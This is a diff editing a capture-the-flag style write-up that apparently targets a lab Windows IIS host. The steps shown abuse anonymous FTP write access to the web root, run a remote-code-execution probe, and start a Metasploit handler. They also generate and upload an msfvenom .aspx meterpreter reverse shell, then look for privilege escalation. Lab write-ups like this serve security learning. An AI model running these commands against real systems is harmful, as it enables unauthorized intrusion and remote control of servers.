@@ -27,7 +27,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 9.81 seconds
 ```
 
-# Attack surface
+# Foothold
 FTP allows for anonymous connection. By browsing FTP root directory we can see that this is also root directory for HTTP server. What is more we have write permission to this directory. Let's try to upload `.aspx` probe to see if we could execute arbitrary code (Remote Code Execute vulnerability) on IIS server.
 
 ```
@@ -45,10 +45,7 @@ curl -s ftp://anonymous@$TARGET_IP/probe.aspx -Q "-DELE probe.aspx" > /dev/null
 EOF
 ```
 
-Our probe shows that `Target is vulnerable to RCE`. We could use this vulnerability to upload `.aspx` reverse shell.
-
-# Attack vector
-Let's start Metasploit `multi/handler` with `windows/meterpreter/reverse_https` payload.
+Our probe shows that `Target is vulnerable to RCE`. We could use this vulnerability to upload `.aspx` reverse shell. Let's start Metasploit `multi/handler` with `windows/meterpreter/reverse_https` payload.
 ```
 msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 4444; set payload windows/meterpreter/reverse_https; run"
 ```
@@ -61,7 +58,7 @@ payload => windows/meterpreter/reverse_https
 [*] Started HTTPS reverse handler on https://10.10.14.212:4444
 ```
 
-It's waiting for connection, so now let's create reverse shell with `.aspx` format, upload it over anonymous FTP connection, execute with HTTP GET call (to establish connection to `multi/handler`) and delete with another FTP connection. All in one line :)
+It's waiting for connection, so now let's create reverse shell with `.aspx` format, upload it over anonymous FTP connection, execute with HTTP GET call (to establish connection to `multi/handler`) and delete with another FTP connection.
 ```
 msfvenom -p windows/meterpreter/reverse_https \
     LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
@@ -82,7 +79,7 @@ Server username: IIS APPPOOL\Web
 ```
 
 # Privileges escalation
-To elevate privileges we could use Meterpreter `getsystem`, but in this case it does not give any results (at least for me), so we could try with WinPEAS or, as we are using Meterpreter, use Multi Recon Local Exploit Suggester.
+To elevate privileges we could use Meterpreter `getsystem`, but in this case it does not give any results, so we could try with WinPEAS or, as we are using Meterpreter, use Multi Recon Local Exploit Suggester.
 ```
 meterpreter > background
 msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
